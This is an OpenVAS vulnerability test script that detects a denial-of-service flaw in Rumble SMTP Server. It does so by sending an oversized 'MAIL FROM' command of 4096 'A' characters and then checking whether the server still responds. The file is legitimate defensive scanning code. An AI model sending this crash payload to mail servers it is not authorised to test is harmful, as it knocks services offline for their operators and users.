###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_rumble_smtp_srv_mail_from_cmd_dos_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Rumble SMTP Server 'MAIL FROM' Command Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation may allow remote attackers to cause the
application to crash.

Impact Level: Application";

tag_affected = "Rumble SMTP Server Version 0.25.2232, Other versions may also
be affected.";

tag_insight = "The flaw is due to an error while handling 'MAIL FROM' command,
which can be exploited by remote attackers to crash an affected application by
sending specially crafted 'MAIL FROM' command.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running Rumble SMTP Server and is prone to denial of
service vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802012");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
  script_bugtraq_id(47070);
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("Rumble SMTP Server 'MAIL FROM' Command Denial of Service Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17070/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/99827/");

  script_tag(name:"qod_type", value:"remote_banner");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

##
## The script code starts here
##

include("smtp_func.inc");

## Get the default port of SMTP
smtpPort = get_kb_item("Services/smtp");
if(!smtpPort) {
  smtpPort = 25;
}

## Check Port Status
if(!get_port_state(smtpPort)){
  exit(0);
}

## Confirm the application by checking the banner
banner = get_smtp_banner(port:smtpPort);
if(!banner || "ESMTPSA" >!< banner){
  exit(0);
}

## Open socket with HELO Command
soc1 = smtp_open(port: smtpPort, helo: "mydomain.tld");
if(!soc1){
  exit(0);
}

## Construct and send crafted data to SMTP Server
crafted_data = 'MAIL FROM ' + crap(data: 'A',length:4096) + string("\r\n");
send(socket: soc1, data: crafted_data);
recv(socket:soc1, length:1024);
smtp_close(socket:soc1);

## Sleep for 3 Seconds
sleep(3);

## Check SMTP server is still running
soc2 = smtp_open(port: smtpPort, helo: "mydomain.tld");
if(!soc2) {
  security_message(port:smtpPort);
  exit(0);
}
smtp_close(socket:soc2);
